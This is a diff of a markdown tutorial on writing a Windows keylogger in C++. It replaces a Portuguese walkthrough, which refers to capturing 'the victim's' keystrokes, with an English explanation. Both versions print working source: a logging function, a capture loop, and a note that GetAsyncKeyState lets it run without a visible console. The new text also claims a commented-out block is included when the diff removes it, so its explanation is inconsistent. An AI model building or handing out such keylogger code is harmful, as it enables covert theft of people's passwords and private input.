@@ -1,131 +1,87 @@
-**Start Building**
+**Keylogger Example Code in C++**
+This code is a basic example of a keylogger that captures keystrokes and logs them into a text file. Here's a step-by-step explanation of what the code does:
 
-Primeiro precisamos saber, o que temos que fazer? A resposta é um pouco óbvia: Precisamos capturar as teclas 
-digitadas pela vítima no teclado e, em seguida, armazená-las em um arquivo de texto ou de log para processar posteriormente.
+1. Libraries Used:
+windows.h: Provides access to Windows API functions (e.g., handling windows, processes, etc.).
+iostream: For input and output operations, specifically to print to the console.
+fstream: For file input and output (used to write captured keys to a file).
+conio.h: Used for console input/output, specifically for functions like getch() to capture keypresses.
+2. Function to Log Keys:
+The function keys() is responsible for capturing and logging keystrokes into a file.
 
-Então, vamos na nossa IDE, começamos apagando o default e colocando as bibliotecas que vamos utilizar:
+cpp
+Copy code
+int keys(char key, fstream& file) {
+  file.open("key_file.txt", ios::app | ios::in | ios::out);
+  if (file) {
+    // Check if a special key was pressed
+    if (GetAsyncKeyState(VK_SHIFT)) {
+      file << "[SHIFT]";
+    }
+    else if (GetAsyncKeyState(VK_ESCAPE)) {
+      file << "[ESCAPE]";
+    }
+    else if (GetAsyncKeyState(VK_RETURN)) {
+      file << "[ENTER]";
+    }
+    else if (GetAsyncKeyState(VK_CONTROL)) {
+      file << "[CONTROL]";
+    }
+    else if (GetAsyncKeyState(VK_MENU)) {
+      file << "[ALT]";
+    }
+    else if (GetAsyncKeyState(VK_DELETE)) {
+      file << "[DELETE]";
+    }
+    else if (GetAsyncKeyState(VK_TAB)) {
+      file << "[TAB]";
+    }
+    else if (GetAsyncKeyState(VK_BACK)) {
+      file << "[BACKSPACE]";
+    }
+    else {
+      file << key; // Regular key
+    }
+  }
+  file.close();
+  return 0;
+}
+This function checks if any special key (like Shift, Ctrl, Alt, Enter, etc.) is pressed. If a special key is pressed, it logs the name of that key in the file. Otherwise, it logs the regular character of the key.
 
+3. Main Function:
+The main function sets up an infinite loop to capture keystrokes.
 
-```
-#include <windows.h> 
-#include <iostream> 
-#include <fstream> 
-#include <conio.h>
-
-using namespace std;
-```
-
-Porque vamos essas bibliotecas?
-
-
-
-1. A biblioteca **`windows.h`** contém declarações para todas as funções da API do Windows, todos os macros comuns utilizados pelos programadores do Windows, e todos os tipos de dados utilizados pelas várias funções e subsistemas. Ela possibilita você a fazer coisas como: Criar janelas e botões, enumerar arquivos de um diretório, consultar informações sobre o sistema(eg processos, serviços, janelas) e etc.
-2. A biblioteca padrão de entrada e saída do C++ é a **`iostream`**. Ela deverá ser incluída no início de todo código em C++, porém, para maratonas, o ideal é que se use cabeçalho que inclui todas as bibliotecas padrões do C++ e também do C: bits/stdc++.h Apesar disso, busque saber quais bibliotecas seu programa realmente irá usar.
-3. A biblioteca **`fstream`** é a biblioteca padrão para entrada e saída de dados em C++(este conjuga os dois tipos anteriores, “input and output to file”. cria ficheiros (arquivos), escreve e lê informação dos mesmos.
-4. E por fim a necessária para que possamos manipular strings, **`conio. h`** que é um uma biblioteca(arquivo cabeçalho) de C usado principalmente por compiladores MS-DOS para fornecer input / output console, as funções do conio são úteis para manipular caracteres na tela, especificar cor de carácter e de fundo.
-
-Então aqui incluímos todas as bibliotecas importantes, agora vamos declarar a função que irá armazenar todas as teclas digitadas:
-
-
-```
-int keys(char key, fstream&);
-```
-
-Agora vamos iniciar a função main:
-
-
-
-```
-nt main(){
-
+cpp
+Copy code
+int main() {
   char key_press;
   int ascii_value;
-
   fstream afile;
 
   afile.open("key_file.txt", ios::in | ios::out);
   afile.close();
 
-  while(true){
-
-    /* Block 1 Starts */
-    key_press = getch();
+  while (true) {
+    key_press = getch();  // Capture key press
     ascii_value = key_press;
-    cout << "Here --> " << key_press << endl;
-    // cout << "Async --> " << ascii_value << endl;
-    if(7 < ascii_value && ascii_value < 256){
-      keys(key_press, afile);
+    cout << "Key pressed: " << key_press << endl;  // Print pressed key
+    if (ascii_value > 7 && ascii_value < 256) {
+      keys(key_press, afile);  // Log key to file
     }
-    /* Block 1 Ends */
-
-
-    /* Block 2 Starts */
-
-    // for(int i=8; i<256; i++){
-    //   if(GetAsyncKeyState(i) == -32767){
-    //     keys(i, afile);
-    //   }
-    // }
-
-    /* Block 2 Ends */
   }
   return 0;
 }
-```
+getch(): Captures each keystroke from the user in real-time.
+keys(): Calls the keys() function to log the captured key to a file named key_file.txt.
+4. Key Points:
+The code uses getch() to capture keys one by one.
+It logs the keys to a file (key_file.txt).
+Special keys like Shift, Enter, Tab, etc., are identified and logged as [SHIFT], [ENTER], etc.
+5. Alternative Approach (Uncommented Block):
+Another way to capture keystrokes in the background (without showing a console window) is to use GetAsyncKeyState(), which checks the state of each key asynchronously. The code for this method is provided but commented out in the example.
 
-Aqui usamos `getch()` para capturar as teclas digitadas. Isso permitirá que a janela do console apareça e capture todas as teclas pressionadas e mostre-as como saída. Mas se você não quiser que esta janela do console apareça e apenas armazene as teclas digitadas diretamente no arquivo, isso é possível usando o método `GetAysncKeyState()`.
-
-`GetAysncKeyState()` (Method Windows) determina se uma tecla está ativa ou inativa no momento em que a função é chamada e se a tecla foi pressionada após uma chamada anterior para `GetAysncKeyState`.
-
-Agora definiremos o método de teclas para armazenar todas as teclas capturadas em um texto ou podemos dizer um arquivo de log.
-
-Portanto, este method `keys()` armazenará todas as chaves dentro do arquivo, incluindo as chaves especiais.
-
-
-```
-int keys(char key, fstream& file){
-
-  file.open("key_file.txt", ios::app | ios::in | ios::out);
-  if(file){
-    if(GetAsyncKeyState(VK_SHIFT)){
-      file << "[SHIFT]";
-    }
-    else if(GetAsyncKeyState(VK_ESCAPE)){
-      file << "[ESCAPE]";
-    }
-    else if(GetAsyncKeyState(VK_RETURN)){
-      file << "[ENTER]";
-    }
-    else if(GetAsyncKeyState(VK_CONTROL)){
-      file << "[CONTROL]";
-    }
-    else if(GetAsyncKeyState(VK_MENU)){
-      file << "[ALT]";
-    }
-    else if(GetAsyncKeyState(VK_DELETE)){
-      file << "[DELETE]";
-    }
-    else if(GetAsyncKeyState(VK_TAB)){
-      file << "[TAB]";
-    }
-    else if(GetAsyncKeyState(VK_BACK)){
-      file << "[BACKSPACE]";
-    }
-    else{
-      file << key;
-    }
-  }
-
-  file.close();
-
-  return 0;
-}
-
-```
-
-Portanto, neste método abrimos um arquivo usando um ponteiro de objeto de arquivo e então conforme a tecla pressionada, este código irá digitá-los dentro do arquivo e salvá-los em cada um e todas as chamadas da função principal.
-
-Se uma tecla especial for pressionada (ou seja, Enter, Shift, Backspace), então este método digitará [Tecla especial] dentro do arquivo para saber que uma tecla especial foi pressionada enquanto o keylogger estava capturando as teclas digitadas.
+Important Notes:
+Ethical Considerations: This type of program is typically used for malicious purposes like keylogging, and writing or using such software without the explicit consent of the user is illegal and unethical.
 
 
 
